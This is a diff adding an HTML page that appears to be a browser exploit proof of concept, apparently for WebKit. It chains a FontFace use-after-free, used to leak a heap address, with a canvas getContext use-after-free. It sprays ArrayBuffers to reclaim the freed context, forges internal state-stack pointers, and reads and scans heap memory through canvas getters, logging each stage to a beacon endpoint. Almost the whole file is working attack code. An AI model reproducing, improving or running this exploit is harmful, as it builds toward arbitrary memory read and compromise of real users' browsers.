@@ -1,0 +1,339 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P813</title>
+<style>
+body{background:#0d1117;color:#c9d1d9;font:13px monospace;margin:8px;}
+pre{color:#7ee787;background:#161b22;border:1px solid #30363d;padding:8px;border-radius:4px;white-space:pre-wrap;word-break:break-all;}
+.hit{color:#f0883e;font-weight:bold;}
+</style>
+</head><body>
+<pre id="o">P813 — AB(768) reclaim + forged m_stateStack read</pre>
+<script>
+'use strict';
+var O=document.getElementById('o');
+function log(s){O.textContent+='\n'+s;}
+function bn(t,d){
+  try{
+    var x=new XMLHttpRequest();
+    x.open('GET','/beacon.php?tag=P813-'+encodeURIComponent(t)+'&data='+encodeURIComponent(String(d||'').slice(0,900))+'&t='+Date.now(),false);
+    x.send();
+  }catch(e){}
+}
+var _b8=new ArrayBuffer(8),_f64=new Float64Array(_b8),_bu=new BigUint64Array(_b8);
+function f2h(v){_f64[0]=v;return '0x'+('0000000000000000'+_bu[0].toString(16)).slice(-16);}
+function h16(big){return '0x'+('0000000000000000'+big.toString(16)).slice(-16);}
+
+bn('BOOT','v1');
+
+/* ========== PHASE 1: FontFace UAF for heap address ========== */
+log('Phase 1: FontFace UAF for heap address...');
+
+var st=document.createElement('style');
+st.textContent="@font-face{font-family:bb1;src:local(Arial);unicode-range:U+0042;}";
+document.head.appendChild(st);
+var face=new FontFace('f1',"local('Helvetica')",{unicodeRange:'U+0041'});
+document.fonts.add(face);
+void face.loaded;
+
+var fabs=[],ffired=false;
+Object.defineProperty(FontFace.prototype,'then',{
+  configurable:true,
+  get:function(){
+    if(ffired)return undefined;
+    ffired=true;
+    if(st){st.remove();st.textContent='';st=null;}
+    try{document.fonts.delete(this);}catch(e){}
+    document.body.offsetHeight;
+    fabs=[];
+    for(var i=0;i<64;i++)fabs.push(new ArrayBuffer(192));
+    try{document.fonts.check('1em bb1');}catch(e){}
+    document.body.offsetHeight;
+    return undefined;
+  },set:function(){}
+});
+document.fonts.load('1em f1, bb1','AB');
+
+setTimeout(function(){
+  delete FontFace.prototype.then;
+
+  /* Find reclaimed AB */
+  var bestI=-1,bestNz=0;
+  for(var i=0;i<fabs.length;i++){
+    var u=new Uint8Array(fabs[i]),nz=0;
+    for(var j=0;j<u.length;j++)if(u[j]!==0)nz++;
+    if(nz>bestNz){bestNz=nz;bestI=i;}
+  }
+
+  if(bestI<0||bestNz<4){
+    bn('FONT-MISS','nz='+bestNz);
+    log('FontFace MISS — reloading...');
+    setTimeout(function(){location.reload();},300);
+    return;
+  }
+
+  /* Compute self_addr from q11 */
+  var bv=new DataView(fabs[bestI]);
+  var q11lo=bv.getUint32(0x58,true);
+  var q11hi=bv.getUint32(0x5C,true);
+  if(q11hi===0){
+    bn('FONT-BAD','q11h=0');
+    log('FontFace q11hi=0 — reloading...');
+    setTimeout(function(){location.reload();},300);
+    return;
+  }
+  var borrow=(q11lo<0x68)?1:0;
+  var selfHi=q11hi-borrow;
+  var selfLo=(q11lo-0x68)>>>0;
+  var H_hi=selfHi, H_lo=selfLo;
+
+  bn('FONT-ADDR','H=0x'+H_hi.toString(16)+('00000000'+H_lo.toString(16)).slice(-8));
+  log('FontFace self H = 0x'+H_hi.toString(16)+('00000000'+H_lo.toString(16)).slice(-8));
+
+  /* Write known marker at specific offsets in the FontFace AB
+   * We'll point m_stateStack.m_buffer at H, so State[0] starts at H.
+   * lineWidth = State+48 = H+48
+   * miterLimit = State+64 = H+64 (per pastawithpesto canvas-getcontext-uaf.md)
+   * So write known doubles at those offsets in our AB */
+  var fabDV=new DataView(fabs[bestI]);
+
+  /* Write 1234.5678 at offset 48 (lineWidth position) */
+  fabDV.setFloat64(48, 1234.5678, true);
+  /* Write 9876.5432 at offset 64 (miterLimit position) */
+  fabDV.setFloat64(64, 9876.5432, true);
+  /* Write 0.5 at offset 0 (globalAlpha position) */
+  fabDV.setFloat64(0, 0.5, true);
+
+  bn('MARKERS-SET','lw@48=1234.5678|ml@64=9876.5432|ga@0=0.5');
+  log('Wrote markers into FontFace AB');
+
+  /* ========== PHASE 2: Canvas UAF trigger ========== */
+  log('');
+  log('Phase 2: Canvas UAF + AB(768) reclaim...');
+
+  var innerCtx=null;
+  var canvas=document.createElement('canvas');
+  canvas.width=1;canvas.height=1;
+
+  var opts={};
+  Object.defineProperty(opts,'alpha',{
+    get:function(){
+      innerCtx=canvas.getContext('2d');
+      return true;
+    }
+  });
+  canvas.getContext('bitmaprenderer',opts);
+
+  if(!innerCtx){
+    bn('UAF-FAIL','no_innerCtx');
+    log('UAF failed — reloading...');
+    setTimeout(function(){location.reload();},300);
+    return;
+  }
+  bn('UAF-OK','inner=ok');
+
+  /* Flush dealloc log (helps bmalloc make the freed slot available) */
+  for(var f=0;f<600;f++){var tmp=new ArrayBuffer(16);}
+
+  /* AB(768) spray */
+  var SPRAY=200;
+  var abs=[];
+  var dvs=[];
+  for(var s=0;s<SPRAY;s++){
+    var ab=new ArrayBuffer(768);
+    abs.push(ab);
+    dvs.push(new DataView(ab));
+  }
+  bn('SPRAY','n='+SPRAY);
+
+  /* ========== PHASE 3: Forge m_stateStack in ALL ABs ========== */
+  /*
+   * m_stateStack layout at context offset +112:
+   *   +112: m_buffer (ptr, 8B) — where State[0] starts
+   *   +120: m_capacity (u32, 4B)
+   *   +124: m_size (u32, 4B)
+   *
+   * Set m_buffer = H (FontFace AB address)
+   * This makes State[0] start at H
+   * lineWidth = State[0]+48 = H+48 = our marker 1234.5678
+   *
+   * Also need valid-ish values elsewhere to not crash:
+   *   +0 (vtable) — NOT dereferenced for lineWidth/miterLimit getters
+   *   +32 (m_canvas) — NOT dereferenced for property reads (only for canvas getter)
+   */
+
+  for(var w=0;w<dvs.length;w++){
+    var dv=dvs[w];
+    /* m_stateStack.m_buffer = H */
+    dv.setUint32(112, H_lo, true);
+    dv.setUint32(116, H_hi, true);
+    /* m_stateStack.m_capacity = 1 */
+    dv.setUint32(120, 1, true);
+    /* m_stateStack.m_size = 1 */
+    dv.setUint32(124, 1, true);
+  }
+  bn('FORGE','m_buffer=H|size=1|cap=1');
+
+  /* ========== PHASE 4: CRITICAL READS (may SIGSEGV) ========== */
+  log('');
+  log('Phase 3-4: Forged stateStack reads...');
+  bn('READ-PRE','about_to_read_lineWidth');
+
+  var readOK=false;
+  var lw,ml,ga;
+  try{
+    lw=innerCtx.lineWidth;
+    readOK=true;
+    bn('LW-READ','val='+lw+'|hex='+f2h(lw));
+    log('lineWidth = '+lw+' hex='+f2h(lw));
+  }catch(e){
+    bn('LW-ERR',e.message);
+    log('lineWidth ERROR: '+e.message);
+  }
+
+  if(readOK){
+    try{
+      ml=innerCtx.miterLimit;
+      bn('ML-READ','val='+ml+'|hex='+f2h(ml));
+      log('miterLimit = '+ml+' hex='+f2h(ml));
+    }catch(e){bn('ML-ERR',e.message);}
+
+    try{
+      ga=innerCtx.globalAlpha;
+      bn('GA-READ','val='+ga+'|hex='+f2h(ga));
+      log('globalAlpha = '+ga+' hex='+f2h(ga));
+    }catch(e){bn('GA-ERR',e.message);}
+
+    /* getTransform reads 6 doubles = 48 bytes at State+112 = H+112 */
+    try{
+      var t=innerCtx.getTransform();
+      var tv=[t.a,t.b,t.c,t.d,t.e,t.f];
+      var th=tv.map(function(v){return f2h(v);});
+      bn('TRANSFORM',th.join('|'));
+      log('transform: '+th.join(', '));
+    }catch(e){bn('TRANSFORM-ERR',e.message);}
+
+    /* fillStyle — reads CanvasStyle at State+16 = H+16 */
+    try{
+      var fs=innerCtx.fillStyle;
+      bn('FS','val='+fs);
+      log('fillStyle = "'+fs+'"');
+    }catch(e){bn('FS-ERR',e.message);}
+
+    /* strokeStyle — reads CanvasStyle at State+32 = H+32 */
+    try{
+      var ss=innerCtx.strokeStyle;
+      bn('SS','val='+ss);
+      log('strokeStyle = "'+ss+'"');
+    }catch(e){bn('SS-ERR',e.message);}
+
+    /* Check if markers match! */
+    log('');
+    log('=== VERIFICATION ===');
+    var lwMatch=(lw===1234.5678);
+    var mlMatch=(ml===9876.5432);
+    var gaMatch=(ga===0.5);
+    bn('VERIFY','lw='+(lwMatch?'MATCH':'MISS:'+lw)+'|ml='+(mlMatch?'MATCH':'MISS:'+ml)+'|ga='+(gaMatch?'MATCH':'MISS:'+ga));
+    log('lineWidth marker: '+(lwMatch?'MATCH':'MISS (got '+lw+')'));
+    log('miterLimit marker: '+(mlMatch?'MATCH':'MISS (got '+ml+')'));
+    log('globalAlpha marker: '+(gaMatch?'MATCH':'MISS (got '+ga+')'));
+
+    if(lwMatch&&mlMatch){
+      log('');
+      log('*** AB RECLAIM + FORGED STATESTACK CONFIRMED! ***');
+      bn('CONFIRMED','ab_reclaim_forged_statestack_works');
+
+      /* ========== PHASE 5: Now scan PAST the FontFace AB (adjacent heap) ========== */
+      log('');
+      log('Phase 5: Scanning adjacent heap (H+192 and beyond)...');
+
+      /* Clean up forged data, prepare for second read */
+      innerCtx=null;
+
+      /* Second UAF for heap scan */
+      var innerCtx2=null;
+      var canvas2=document.createElement('canvas');
+      canvas2.width=1;canvas2.height=1;
+      var opts2={};
+      Object.defineProperty(opts2,'alpha',{
+        get:function(){
+          innerCtx2=canvas2.getContext('2d');
+          return true;
+        }
+      });
+      canvas2.getContext('bitmaprenderer',opts2);
+
+      if(innerCtx2){
+        bn('UAF2-OK','ok');
+        /* Flush + spray again */
+        for(var f2=0;f2<600;f2++){var t2=new ArrayBuffer(16);}
+        var abs2=[],dvs2=[];
+        for(var s2=0;s2<200;s2++){
+          var ab2=new ArrayBuffer(768);
+          abs2.push(ab2);
+          dvs2.push(new DataView(ab2));
+        }
+
+        /* Point at H+192-48 = H+144, so lineWidth reads at H+192 (next heap object) */
+        var scanLo=(H_lo+144)>>>0;
+        var scanHi=H_hi+((H_lo+144>0xFFFFFFFF)?1:0);
+
+        for(var w2=0;w2<dvs2.length;w2++){
+          dvs2[w2].setUint32(112, scanLo, true);
+          dvs2[w2].setUint32(116, scanHi, true);
+          dvs2[w2].setUint32(120, 1, true);
+          dvs2[w2].setUint32(124, 1, true);
+        }
+        bn('SCAN-FORGE','target=H+192');
+
+        try{
+          var scanLW=innerCtx2.lineWidth;
+          bn('SCAN-LW','val='+scanLW+'|hex='+f2h(scanLW));
+          log('H+192 lineWidth = '+scanLW+' hex='+f2h(scanLW));
+
+          var scanML=innerCtx2.miterLimit;
+          bn('SCAN-ML','val='+scanML+'|hex='+f2h(scanML));
+          log('H+192 miterLimit = '+scanML+' hex='+f2h(scanML));
+
+          var scanT=innerCtx2.getTransform();
+          var stv=[scanT.a,scanT.b,scanT.c,scanT.d,scanT.e,scanT.f];
+          var sth=stv.map(function(v){return f2h(v);});
+          bn('SCAN-TRANSFORM',sth.join('|'));
+          log('H+192 transform: '+sth.join(', '));
+
+          try{
+            var scanFS=innerCtx2.fillStyle;
+            bn('SCAN-FS','val='+scanFS);
+            log('H+192 fillStyle = "'+scanFS+'"');
+          }catch(e){bn('SCAN-FS-ERR',e.message);}
+
+          /* Null out before GC */
+          innerCtx2=null;
+        }catch(e){
+          bn('SCAN-ERR',e.message);
+          log('Scan error (unmapped?): '+e.message);
+          innerCtx2=null;
+        }
+      }else{
+        bn('UAF2-FAIL','no_ctx');
+      }
+    }else{
+      log('Markers did not match — AB reclaim may have missed.');
+      log('Expected: 1234.5678 / 9876.5432 / 0.5');
+      log('Got: '+lw+' / '+ml+' / '+ga);
+    }
+  }
+
+  /* Clean up */
+  innerCtx=null;
+  for(var c=0;c<dvs.length;c++){
+    dvs[c].setFloat64(112,0,true);
+    dvs[c].setUint32(120,0,true);
+    dvs[c].setUint32(124,0,true);
+  }
+
+  bn('DONE','complete');
+  log('');
+  log('=== P813 COMPLETE ===');
+},600);
+</script></body></html>
